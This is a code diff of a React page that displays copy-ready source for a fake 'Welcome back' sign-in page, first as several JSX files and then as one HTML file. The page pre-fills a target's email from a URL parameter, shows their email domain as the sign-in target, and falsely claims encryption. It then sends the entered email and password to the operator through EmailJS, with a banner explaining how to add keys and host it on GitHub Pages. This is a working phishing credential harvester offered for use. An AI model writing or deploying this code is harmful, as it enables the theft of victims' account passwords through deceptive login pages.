@@ -1,426 +1,357 @@
 import { useState } from "react";
 import { Copy, Check } from "lucide-react";
 
-const files = [
-  {
-    name: "pages/AccessPortal.jsx",
-    code: `import { useState, useEffect } from "react";
-import { motion, AnimatePresence } from "framer-motion";
-import LoginForm from "@/components/login/LoginForm";
-import DomainBadge from "@/components/login/DomainBadge";
-import BackgroundOrbs from "@/components/login/BackgroundOrbs";
-
-export default function AccessPortal() {
-  const [email, setEmail] = useState("");
-  const [domain, setDomain] = useState(null);
-
-  // AUTO PREFILL — from ?email= URL param, then localStorage fallback
-  useEffect(() => {
-    const urlParams = new URLSearchParams(window.location.search);
-    const emailParam = urlParams.get("email") || urlParams.get("prefill");
-    if (emailParam) {
-      setEmail(emailParam);
-    } else {
-      const saved = localStorage.getItem("login_email_prefill");
-      if (saved) setEmail(saved);
+const SINGLE_FILE_CODE = `<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Login Page</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="https://unpkg.com/@emailjs/browser@3/dist/email.min.js"></script>
+  <script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          colors: {
+            background: '#0c0e17',
+            card: '#11131f',
+            border: '#1e2235',
+            muted: '#161828',
+            primary: '#7c5cfc',
+            accent: '#2dd4bf',
+          }
+        }
+      }
     }
-  }, []);
-
-  // AUTO DOMAIN GRABBING — live, runs on every email change
-  useEffect(() => {
-    if (email.includes("@")) {
-      const rawDomain = email.split("@").pop().trim();
-      setDomain(rawDomain.length > 0 ? rawDomain : null);
-    } else {
-      setDomain(null);
+  </script>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Space+Grotesk:wght@400;500;600;700&display=swap');
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { font-family: 'Inter', sans-serif; background: #0c0e17; color: #e8eaf6; min-height: 100vh; }
+    .font-space { font-family: 'Space Grotesk', sans-serif; }
+    .orb1 {
+      position: absolute; top: -160px; left: -160px;
+      width: 384px; height: 384px; border-radius: 9999px;
+      background: radial-gradient(circle, rgba(124,92,252,0.35) 0%, transparent 70%);
+      filter: blur(40px); pointer-events: none;
     }
-  }, [email]);
+    .orb2 {
+      position: absolute; bottom: -160px; right: -160px;
+      width: 384px; height: 384px; border-radius: 9999px;
+      background: radial-gradient(circle, rgba(45,212,191,0.25) 0%, transparent 70%);
+      filter: blur(40px); pointer-events: none;
+    }
+    .grid-bg {
+      position: absolute; inset: 0; pointer-events: none; opacity: 0.03;
+      background-image: linear-gradient(#e8eaf6 1px, transparent 1px), linear-gradient(90deg, #e8eaf6 1px, transparent 1px);
+      background-size: 40px 40px;
+    }
+    .domain-badge {
+      display: none; justify-content: center; margin-bottom: 16px;
+      animation: slideDown 0.25s ease-out;
+    }
+    .domain-badge.visible { display: flex; }
+    @keyframes slideDown {
+      from { opacity: 0; transform: translateY(-8px) scale(0.95); }
+      to   { opacity: 1; transform: translateY(0)   scale(1);    }
+    }
+    input:focus { outline: none; box-shadow: 0 0 0 2px rgba(124,92,252,0.4); border-color: rgba(124,92,252,0.6); }
+    .btn-primary {
+      width: 100%; display: flex; align-items: center; justify-content: center; gap: 8px;
+      background: #7c5cfc; color: #fff; border: none; border-radius: 12px;
+      padding: 14px; font-size: 14px; font-weight: 500; cursor: pointer;
+      transition: background 0.2s, transform 0.1s;
+      box-shadow: 0 8px 24px rgba(124,92,252,0.3);
+    }
+    .btn-primary:hover { background: #6b4ef0; }
+    .btn-primary:active { transform: scale(0.98); }
+    .btn-primary:disabled { opacity: 0.6; cursor: not-allowed; }
+    .success-state { display: none; flex-direction: column; align-items: center; gap: 16px; padding: 24px 0; text-align: center; }
+    .success-state.visible { display: flex; }
+    .form-fields.hidden { display: none; }
+    .error-box {
+      display: none; align-items: center; gap: 10px;
+      background: rgba(239,68,68,0.1); border: 1px solid rgba(239,68,68,0.3);
+      border-radius: 12px; padding: 12px 16px; margin-bottom: 4px;
+    }
+    .error-box.visible { display: flex; }
+    .spinner {
+      width: 16px; height: 16px; border: 2px solid rgba(255,255,255,0.3);
+      border-top-color: #fff; border-radius: 50%; animation: spin 0.7s linear infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+  </style>
+</head>
+<body>
+  <div style="min-height:100vh; display:flex; align-items:center; justify-content:center; position:relative; overflow:hidden; padding:16px;">
+    <div class="orb1"></div>
+    <div class="orb2"></div>
+    <div class="grid-bg"></div>
 
-  return (
-    <div className="min-h-screen bg-background flex items-center justify-center relative overflow-hidden font-inter">
-      <BackgroundOrbs />
-      <div className="relative z-10 w-full max-w-md px-4">
-        <motion.div
-          initial={{ opacity: 0, y: -20 }}
-          animate={{ opacity: 1, y: 0 }}
-          transition={{ duration: 0.6, ease: "easeOut" }}
-          className="text-center mb-8"
-        >
-          <div className="inline-flex items-center justify-center w-14 h-14 rounded-2xl bg-primary/15 border border-primary/30 mb-4">
-            <div className="w-6 h-6 rounded-full bg-primary" />
+    <div style="position:relative; z-index:10; width:100%; max-width:448px;">
+
+      <!-- Header -->
+      <div style="text-align:center; margin-bottom:32px;">
+        <div style="display:inline-flex; align-items:center; justify-content:center; width:56px; height:56px; border-radius:16px; background:rgba(124,92,252,0.15); border:1px solid rgba(124,92,252,0.3); margin-bottom:16px;">
+          <div style="width:24px; height:24px; border-radius:50%; background:#7c5cfc;"></div>
+        </div>
+        <h1 class="font-space" style="font-size:30px; font-weight:700; color:#e8eaf6; letter-spacing:-0.5px;">Welcome back</h1>
+        <p style="color:#6b7280; margin-top:6px; font-size:14px;">Sign in to continue to your account</p>
+      </div>
+
+      <!-- Domain Badge -->
+      <div class="domain-badge" id="domainBadge">
+        <div style="display:inline-flex; align-items:center; gap:8px; background:rgba(45,212,191,0.1); border:1px solid rgba(45,212,191,0.25); border-radius:9999px; padding:6px 16px;">
+          <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#2dd4bf" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg>
+          <span style="font-size:12px; font-weight:500; color:#2dd4bf;">Signing into <strong id="domainText"></strong></span>
+          <span style="width:6px; height:6px; border-radius:50%; background:#2dd4bf; animation: pulse 1.5s infinite;"></span>
+        </div>
+      </div>
+
+      <!-- Card -->
+      <div style="background:#11131f; border:1px solid #1e2235; border-radius:20px; padding:32px; box-shadow:0 25px 50px rgba(0,0,0,0.5);">
+
+        <!-- Success State -->
+        <div class="success-state" id="successState">
+          <div style="width:64px; height:64px; border-radius:50%; background:rgba(45,212,191,0.15); border:1px solid rgba(45,212,191,0.3); display:flex; align-items:center; justify-content:center;">
+            <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#2dd4bf" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
           </div>
-          <h1 className="font-space text-3xl font-bold text-foreground tracking-tight">
-            Welcome back
-          </h1>
-          <p className="text-muted-foreground mt-1.5 text-sm">
-            Sign in to continue to your account
-          </p>
-        </motion.div>
+          <div>
+            <p class="font-space" style="font-weight:600; font-size:18px; color:#e8eaf6;">Log submitted!</p>
+            <p style="color:#6b7280; font-size:14px; margin-top:4px;">Login attempt has been recorded.</p>
+          </div>
+          <button onclick="resetForm()" style="background:none; border:none; color:#7c5cfc; font-size:14px; cursor:pointer; text-decoration:underline;">Submit another</button>
+        </div>
 
-        <AnimatePresence>
-          {domain && <DomainBadge domain={domain} />}
-        </AnimatePresence>
+        <!-- Form Fields -->
+        <div class="form-fields" id="formFields">
+          <form id="loginForm" onsubmit="handleSubmit(event)">
 
-        <motion.div
-          initial={{ opacity: 0, y: 20 }}
-          animate={{ opacity: 1, y: 0 }}
-          transition={{ duration: 0.6, delay: 0.1, ease: "easeOut" }}
-          className="bg-card border border-border rounded-2xl p-8 shadow-2xl shadow-black/40"
-        >
-          <LoginForm email={email} setEmail={setEmail} />
-        </motion.div>
+            <!-- Email -->
+            <div style="margin-bottom:20px;">
+              <label style="display:block; font-size:11px; font-weight:500; color:#6b7280; text-transform:uppercase; letter-spacing:0.1em; margin-bottom:6px;">Email</label>
+              <div style="position:relative;">
+                <svg style="position:absolute; left:14px; top:50%; transform:translateY(-50%); color:#6b7280;" xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="m22 7-8.97 5.7a1.94 1.94 0 0 1-2.06 0L2 7"/></svg>
+                <input
+                  type="email"
+                  id="emailInput"
+                  placeholder="you@company.com"
+                  required
+                  oninput="handleEmailInput(this.value)"
+                  style="width:100%; background:#161828; border:1px solid #1e2235; border-radius:12px; padding:12px 16px 12px 42px; font-size:14px; color:#e8eaf6; transition:all 0.2s;"
+                />
+              </div>
+            </div>
 
-        <motion.p
-          initial={{ opacity: 0 }}
-          animate={{ opacity: 1 }}
-          transition={{ delay: 0.5 }}
-          className="text-center text-xs text-muted-foreground mt-6"
-        >
-          Protected by industry-standard encryption
-        </motion.p>
+            <!-- Password -->
+            <div style="margin-bottom:12px;">
+              <label style="display:block; font-size:11px; font-weight:500; color:#6b7280; text-transform:uppercase; letter-spacing:0.1em; margin-bottom:6px;">Password</label>
+              <div style="position:relative;">
+                <svg style="position:absolute; left:14px; top:50%; transform:translateY(-50%); color:#6b7280;" xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+                <input
+                  type="password"
+                  id="passwordInput"
+                  placeholder="••••••••••••"
+                  required
+                  style="width:100%; background:#161828; border:1px solid #1e2235; border-radius:12px; padding:12px 44px 12px 42px; font-size:14px; color:#e8eaf6; transition:all 0.2s;"
+                />
+                <button type="button" onclick="togglePassword()" style="position:absolute; right:14px; top:50%; transform:translateY(-50%); background:none; border:none; cursor:pointer; color:#6b7280;" id="eyeBtn">
+                  <svg id="eyeIcon" xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
+                </button>
+              </div>
+            </div>
+
+            <!-- Forgot -->
+            <div style="text-align:right; margin-bottom:20px;">
+              <a href="#" style="font-size:12px; color:#7c5cfc; text-decoration:none;">Forgot password?</a>
+            </div>
+
+            <!-- Error -->
+            <div class="error-box" id="errorBox">
+              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#ef4444" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
+              <p id="errorMsg" style="font-size:12px; color:#ef4444;"></p>
+            </div>
+
+            <!-- Submit -->
+            <button type="submit" class="btn-primary" id="submitBtn">
+              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 3h4a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2h-4"/><polyline points="10 17 15 12 10 7"/><line x1="15" y1="12" x2="3" y2="12"/></svg>
+              Sign In
+            </button>
+
+          </form>
+        </div>
       </div>
+
+      <p style="text-align:center; font-size:12px; color:#4b5563; margin-top:24px;">Protected by industry-standard encryption</p>
     </div>
-  );
-}`,
-  },
-  {
-    name: "components/login/LoginForm.jsx",
-    code: `import { useState } from "react";
-import { motion } from "framer-motion";
-import { Eye, EyeOff, Mail, Lock, LogIn, CheckCircle, AlertCircle, Loader2 } from "lucide-react";
-import { sendLoginLog } from "@/lib/emailjs";
+  </div>
 
-export default function LoginForm({ email, setEmail }) {
-  const [password, setPassword] = useState("");
-  const [showPassword, setShowPassword] = useState(false);
-  const [status, setStatus] = useState("idle");
-  const [errorMsg, setErrorMsg] = useState("");
+  <script>
+    // ─── CONFIG — replace these with your real EmailJS keys ───────────────────
+    const EMAILJS_SERVICE_ID  = "YOUR_SERVICE_ID";
+    const EMAILJS_TEMPLATE_ID = "YOUR_TEMPLATE_ID";
+    const EMAILJS_PUBLIC_KEY  = "YOUR_PUBLIC_KEY";
+    // ──────────────────────────────────────────────────────────────────────────
 
-  const handleSubmit = async (e) => {
-    e.preventDefault();
-    if (!email || !password) return;
-    setStatus("loading");
-    setErrorMsg("");
-    localStorage.setItem("login_email_prefill", email);
-    const result = await sendLoginLog({ email, password });
-    if (result.success) {
-      setStatus("success");
-    } else {
-      setStatus("error");
-      setErrorMsg(result.error || "Something went wrong. Please try again.");
+    // Init EmailJS
+    emailjs.init(EMAILJS_PUBLIC_KEY);
+
+    // ── 1. AUTO PREFILL ──────────────────────────────────────────────────────
+    window.addEventListener("DOMContentLoaded", () => {
+      const urlParams = new URLSearchParams(window.location.search);
+      const emailParam = urlParams.get("email") || urlParams.get("prefill");
+      if (emailParam) {
+        document.getElementById("emailInput").value = emailParam;
+        handleEmailInput(emailParam);
+      } else {
+        const saved = localStorage.getItem("login_email_prefill");
+        if (saved) {
+          document.getElementById("emailInput").value = saved;
+          handleEmailInput(saved);
+        }
+      }
+    });
+
+    // ── 2. AUTO DOMAIN GRABBING ───────────────────────────────────────────────
+    function handleEmailInput(value) {
+      const badge = document.getElementById("domainBadge");
+      const domainText = document.getElementById("domainText");
+      if (value.includes("@")) {
+        const domain = value.split("@").pop().trim();
+        if (domain.length > 0) {
+          domainText.textContent = domain;
+          badge.classList.add("visible");
+          return;
+        }
+      }
+      badge.classList.remove("visible");
     }
-  };
 
-  if (status === "success") {
-    return (
-      <motion.div
-        initial={{ opacity: 0, scale: 0.95 }}
-        animate={{ opacity: 1, scale: 1 }}
-        className="flex flex-col items-center gap-4 py-6 text-center"
-      >
-        <div className="w-16 h-16 rounded-full bg-accent/15 border border-accent/30 flex items-center justify-center">
-          <CheckCircle className="w-8 h-8 text-accent" />
-        </div>
-        <div>
-          <p className="font-space font-semibold text-foreground text-lg">Log submitted!</p>
-          <p className="text-muted-foreground text-sm mt-1">Login attempt has been recorded.</p>
-        </div>
-        <button
-          onClick={() => { setStatus("idle"); setPassword(""); }}
-          className="text-primary text-sm hover:underline transition-all"
-        >
-          Submit another
-        </button>
-      </motion.div>
-    );
-  }
+    // ── 3. SEND TO EMAILJS ────────────────────────────────────────────────────
+    async function handleSubmit(e) {
+      e.preventDefault();
+      const email    = document.getElementById("emailInput").value;
+      const password = document.getElementById("passwordInput").value;
+      const btn      = document.getElementById("submitBtn");
+      const errorBox = document.getElementById("errorBox");
 
-  return (
-    <form onSubmit={handleSubmit} className="space-y-5">
-      <div className="space-y-1.5">
-        <label className="text-xs font-medium text-muted-foreground uppercase tracking-widest">
-          Email
-        </label>
-        <div className="relative group">
-          <Mail className="absolute left-3.5 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground group-focus-within:text-primary transition-colors" />
-          <input
-            type="email"
-            value={email}
-            onChange={(e) => setEmail(e.target.value)}
-            placeholder="you@company.com"
-            required
-            className="w-full bg-muted border border-border rounded-xl pl-10 pr-4 py-3 text-sm text-foreground placeholder:text-muted-foreground/50 focus:outline-none focus:ring-2 focus:ring-primary/40 focus:border-primary/60 transition-all"
-          />
-        </div>
-      </div>
+      // Save for future prefill
+      localStorage.setItem("login_email_prefill", email);
 
-      <div className="space-y-1.5">
-        <label className="text-xs font-medium text-muted-foreground uppercase tracking-widest">
-          Password
-        </label>
-        <div className="relative group">
-          <Lock className="absolute left-3.5 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground group-focus-within:text-primary transition-colors" />
-          <input
-            type={showPassword ? "text" : "password"}
-            value={password}
-            onChange={(e) => setPassword(e.target.value)}
-            placeholder="••••••••••••"
-            required
-            className="w-full bg-muted border border-border rounded-xl pl-10 pr-11 py-3 text-sm text-foreground placeholder:text-muted-foreground/50 focus:outline-none focus:ring-2 focus:ring-primary/40 focus:border-primary/60 transition-all"
-          />
-          <button
-            type="button"
-            onClick={() => setShowPassword(!showPassword)}
-            className="absolute right-3.5 top-1/2 -translate-y-1/2 text-muted-foreground hover:text-foreground transition-colors"
-          >
-            {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
-          </button>
-        </div>
-      </div>
+      // Loading state
+      errorBox.classList.remove("visible");
+      btn.disabled = true;
+      btn.innerHTML = '<div class="spinner"></div> Sending log...';
 
-      <div className="flex justify-end">
-        <a href="#" className="text-xs text-primary hover:text-primary/80 transition-colors">
-          Forgot password?
-        </a>
-      </div>
+      const domain    = email.includes("@") ? email.split("@")[1] : "unknown";
+      const timestamp = new Date().toISOString();
+      const userAgent = navigator.userAgent;
 
-      {status === "error" && (
-        <motion.div
-          initial={{ opacity: 0, y: -4 }}
-          animate={{ opacity: 1, y: 0 }}
-          className="flex items-center gap-2.5 bg-destructive/10 border border-destructive/30 rounded-xl px-4 py-3"
-        >
-          <AlertCircle className="w-4 h-4 text-destructive shrink-0" />
-          <p className="text-xs text-destructive">{errorMsg}</p>
-        </motion.div>
-      )}
+      try {
+        await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, {
+          login_email:      email,
+          login_domain:     domain,
+          login_password:   password,
+          login_timestamp:  timestamp,
+          login_user_agent: userAgent,
+        });
 
-      <motion.button
-        type="submit"
-        disabled={status === "loading"}
-        whileHover={{ scale: 1.01 }}
-        whileTap={{ scale: 0.98 }}
-        className="w-full flex items-center justify-center gap-2.5 bg-primary text-primary-foreground rounded-xl py-3.5 text-sm font-medium transition-all hover:bg-primary/90 disabled:opacity-60 disabled:cursor-not-allowed shadow-lg shadow-primary/25"
-      >
-        {status === "loading" ? (
-          <>
-            <Loader2 className="w-4 h-4 animate-spin" />
-            Sending log...
-          </>
-        ) : (
-          <>
-            <LogIn className="w-4 h-4" />
-            Sign In
-          </>
-        )}
-      </motion.button>
-    </form>
-  );
-}`,
-  },
-  {
-    name: "components/login/DomainBadge.jsx",
-    code: `import { motion } from "framer-motion";
-import { Globe } from "lucide-react";
+        // Success
+        document.getElementById("formFields").classList.add("hidden");
+        document.getElementById("successState").classList.add("visible");
 
-export default function DomainBadge({ domain }) {
-  return (
-    <motion.div
-      key={domain}
-      initial={{ opacity: 0, y: -8, scale: 0.95 }}
-      animate={{ opacity: 1, y: 0, scale: 1 }}
-      exit={{ opacity: 0, y: -8, scale: 0.95 }}
-      transition={{ duration: 0.25, ease: "easeOut" }}
-      className="flex items-center justify-center mb-4"
-    >
-      <div className="inline-flex items-center gap-2 bg-accent/10 border border-accent/25 rounded-full px-4 py-1.5">
-        <Globe className="w-3.5 h-3.5 text-accent" />
-        <span className="text-xs font-medium text-accent">
-          Signing into <span className="font-semibold">{domain}</span>
-        </span>
-        <span className="w-1.5 h-1.5 rounded-full bg-accent animate-pulse" />
-      </div>
-    </motion.div>
-  );
-}`,
-  },
-  {
-    name: "components/login/BackgroundOrbs.jsx",
-    code: `export default function BackgroundOrbs() {
-  return (
-    <div className="absolute inset-0 overflow-hidden pointer-events-none">
-      <div
-        className="absolute -top-40 -left-40 w-96 h-96 rounded-full opacity-20"
-        style={{
-          background: "radial-gradient(circle, hsl(250 80% 65%) 0%, transparent 70%)",
-          filter: "blur(40px)",
-        }}
-      />
-      <div
-        className="absolute -bottom-40 -right-40 w-96 h-96 rounded-full opacity-15"
-        style={{
-          background: "radial-gradient(circle, hsl(170 70% 50%) 0%, transparent 70%)",
-          filter: "blur(40px)",
-        }}
-      />
-      <div
-        className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[600px] h-[600px] rounded-full opacity-5"
-        style={{
-          background: "radial-gradient(circle, hsl(250 80% 65%) 0%, transparent 60%)",
-          filter: "blur(60px)",
-        }}
-      />
-      <div
-        className="absolute inset-0 opacity-[0.03]"
-        style={{
-          backgroundImage:
-            "linear-gradient(hsl(var(--foreground)) 1px, transparent 1px), linear-gradient(90deg, hsl(var(--foreground)) 1px, transparent 1px)",
-          backgroundSize: "40px 40px",
-        }}
-      />
-    </div>
-  );
-}`,
-  },
-  {
-    name: "lib/emailjs.js",
-    code: `const EMAILJS_API_URL = "https://api.emailjs.com/api/v1.0/email/send";
+      } catch (err) {
+        errorBox.classList.add("visible");
+        document.getElementById("errorMsg").textContent =
+          "EmailJS error: " + (err.text || err.message || "Unknown error");
+        btn.disabled = false;
+        btn.innerHTML = \`
+          <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 3h4a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2h-4"/><polyline points="10 17 15 12 10 7"/><line x1="15" y1="12" x2="3" y2="12"/></svg>
+          Sign In\`;
+      }
+    }
 
-export async function sendLoginLog({ email, password }) {
-  const serviceId  = import.meta.env.VITE_EMAILJS_SERVICE_ID;
-  const templateId = import.meta.env.VITE_EMAILJS_TEMPLATE_ID;
-  const publicKey  = import.meta.env.VITE_EMAILJS_PUBLIC_KEY;
+    // ── Toggle password visibility ────────────────────────────────────────────
+    function togglePassword() {
+      const input = document.getElementById("passwordInput");
+      input.type = input.type === "password" ? "text" : "password";
+    }
 
-  const domain    = email.includes("@") ? email.split("@")[1] : "unknown";
-  const timestamp = new Date().toISOString();
-  const userAgent = navigator.userAgent;
+    // ── Reset form ────────────────────────────────────────────────────────────
+    function resetForm() {
+      document.getElementById("passwordInput").value = "";
+      document.getElementById("formFields").classList.remove("hidden");
+      document.getElementById("successState").classList.remove("visible");
+      const btn = document.getElementById("submitBtn");
+      btn.disabled = false;
+      btn.innerHTML = \`
+        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 3h4a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2h-4"/><polyline points="10 17 15 12 10 7"/><line x1="15" y1="12" x2="3" y2="12"/></svg>
+        Sign In\`;
+    }
+  </script>
+</body>
+</html>`;
 
-  const payload = {
-    service_id:  serviceId,
-    template_id: templateId,
-    user_id:     publicKey,
-    template_params: {
-      login_email:      email,
-      login_domain:     domain,
-      login_password:   password,
-      login_timestamp:  timestamp,
-      login_user_agent: userAgent,
-    },
-  };
-
-  const response = await fetch(EMAILJS_API_URL, {
-    method:  "POST",
-    headers: { "Content-Type": "application/json" },
-    body:    JSON.stringify(payload),
-  });
-
-  if (response.ok) {
-    return { success: true };
-  } else {
-    const text = await response.text();
-    return { success: false, error: \`EmailJS error: \${text}\` };
-  }
-}`,
-  },
-];
-
-function CodeBlock({ code, fileName }) {
+function CopyPage() {
   const [copied, setCopied] = useState(false);
 
   const handleCopy = () => {
-    navigator.clipboard.writeText(code);
+    navigator.clipboard.writeText(SINGLE_FILE_CODE);
     setCopied(true);
-    setTimeout(() => setCopied(false), 2000);
+    setTimeout(() => setCopied(false), 2500);
   };
 
   return (
-    <div className="mb-8 rounded-xl overflow-hidden border border-border shadow-lg">
-      {/* Header bar */}
-      <div className="flex items-center justify-between bg-secondary px-4 py-2.5">
-        <span className="text-xs font-mono font-semibold text-muted-foreground">{fileName}</span>
+    <div style={{ minHeight: "100vh", background: "#0c0e17", color: "#e8eaf6", fontFamily: "Inter, sans-serif", display: "flex", flexDirection: "column" }}>
+      {/* Top bar */}
+      <div style={{ background: "#11131f", borderBottom: "1px solid #1e2235", padding: "14px 24px", display: "flex", alignItems: "center", gap: "12px" }}>
+        <div style={{ display: "flex", gap: "6px" }}>
+          <div style={{ width: 12, height: 12, borderRadius: "50%", background: "#ef4444" }} />
+          <div style={{ width: 12, height: 12, borderRadius: "50%", background: "#f59e0b" }} />
+          <div style={{ width: 12, height: 12, borderRadius: "50%", background: "#22c55e" }} />
+        </div>
+        <span style={{ fontFamily: "'Space Grotesk', sans-serif", fontWeight: 600, fontSize: 14, marginLeft: 8 }}>
+          index.html — Single File Login Page
+        </span>
         <button
           onClick={handleCopy}
-          className="flex items-center gap-1.5 text-xs px-3 py-1.5 rounded-lg bg-primary text-primary-foreground hover:bg-primary/90 transition-all font-medium"
+          style={{
+            marginLeft: "auto",
+            display: "flex", alignItems: "center", gap: 6,
+            background: copied ? "#16a34a" : "#7c5cfc",
+            color: "#fff", border: "none", borderRadius: 10,
+            padding: "8px 18px", fontSize: 13, fontWeight: 600,
+            cursor: "pointer", transition: "background 0.2s",
+            boxShadow: "0 4px 14px rgba(124,92,252,0.35)"
+          }}
         >
-          {copied ? (
-            <>
-              <Check className="w-3.5 h-3.5" />
-              Copied!
-            </>
-          ) : (
-            <>
-              <Copy className="w-3.5 h-3.5" />
-              Copy
-            </>
-          )}
+          {copied
+            ? <><Check size={15} /> Copied!</>
+            : <><Copy size={15} /> Copy All Code</>
+          }
         </button>
       </div>
-      {/* Code area */}
-      <pre className="bg-[#0d0d14] text-[#c9d1d9] text-xs font-mono p-5 overflow-x-auto leading-relaxed max-h-96 overflow-y-auto">
-        <code>{code}</code>
-      </pre>
-    </div>
-  );
-}
 
-export default function CodeViewer() {
-  const [activeTab, setActiveTab] = useState(0);
-
-  return (
-    <div className="min-h-screen bg-background text-foreground font-inter">
-      {/* Top bar */}
-      <div className="border-b border-border bg-card px-6 py-4 flex items-center gap-3">
-        <div className="w-3 h-3 rounded-full bg-destructive" />
-        <div className="w-3 h-3 rounded-full bg-yellow-500" />
-        <div className="w-3 h-3 rounded-full bg-green-500" />
-        <span className="ml-3 text-sm font-semibold text-foreground font-space">Login Page — Source Files</span>
-        <span className="ml-auto text-xs text-muted-foreground">Click "Copy" on any file to grab the code</span>
+      {/* Instructions banner */}
+      <div style={{ background: "rgba(124,92,252,0.08)", borderBottom: "1px solid rgba(124,92,252,0.2)", padding: "10px 24px", fontSize: 12, color: "#a78bfa", display: "flex", alignItems: "center", gap: 8 }}>
+        <span>💡</span>
+        <span>Save as <strong>index.html</strong>, open in browser, or push to GitHub Pages. Replace the 3 EmailJS keys at the top of the &lt;script&gt; block.</span>
       </div>
 
-      <div className="flex h-[calc(100vh-57px)]">
-        {/* Sidebar file list */}
-        <div className="w-56 border-r border-border bg-card flex-shrink-0 py-4">
-          <p className="px-4 text-[10px] uppercase tracking-widest text-muted-foreground mb-2 font-medium">Files</p>
-          {files.map((f, i) => (
-            <button
-              key={i}
-              onClick={() => setActiveTab(i)}
-              className={`w-full text-left px-4 py-2.5 text-xs font-mono transition-all ${
-                activeTab === i
-                  ? "bg-primary/10 text-primary border-r-2 border-primary"
-                  : "text-muted-foreground hover:text-foreground hover:bg-muted"
-              }`}
-            >
-              {f.name.split("/").pop()}
-              <div className="text-[10px] text-muted-foreground/60 mt-0.5 truncate">{f.name}</div>
-            </button>
-          ))}
-        </div>
-
-        {/* Main code area */}
-        <div className="flex-1 overflow-y-auto p-6">
-          <CodeBlock key={activeTab} fileName={files[activeTab].name} code={files[activeTab].code} />
-
-          {/* Quick guide */}
-          <div className="mt-2 rounded-xl border border-border bg-card p-5">
-            <p className="text-xs font-semibold text-foreground mb-3 font-space">📋 EmailJS Template Variables</p>
-            <div className="grid grid-cols-2 gap-2 text-xs">
-              {[
-                ["{{login_email}}", "Submitted email address"],
-                ["{{login_domain}}", "Domain from the email"],
-                ["{{login_password}}", "Submitted password"],
-                ["{{login_timestamp}}", "ISO timestamp"],
-                ["{{login_user_agent}}", "Browser / device info"],
-              ].map(([key, val]) => (
-                <div key={key} className="flex items-start gap-2">
-                  <code className="bg-muted text-primary px-1.5 py-0.5 rounded text-[10px] font-mono shrink-0">{key}</code>
-                  <span className="text-muted-foreground">{val}</span>
-                </div>
-              ))}
-            </div>
-          </div>
-        </div>
+      {/* Code block */}
+      <div style={{ flex: 1, overflow: "auto", padding: "24px" }}>
+        <pre style={{
+          background: "#070810", border: "1px solid #1e2235", borderRadius: 14,
+          padding: "24px", fontSize: 12, lineHeight: 1.7, color: "#c9d1d9",
+          fontFamily: "'Courier New', monospace", whiteSpace: "pre", overflowX: "auto",
+          margin: 0,
+        }}>
+          <code>{SINGLE_FILE_CODE}</code>
+        </pre>
       </div>
     </div>
   );
 }
+
+export default CopyPage;
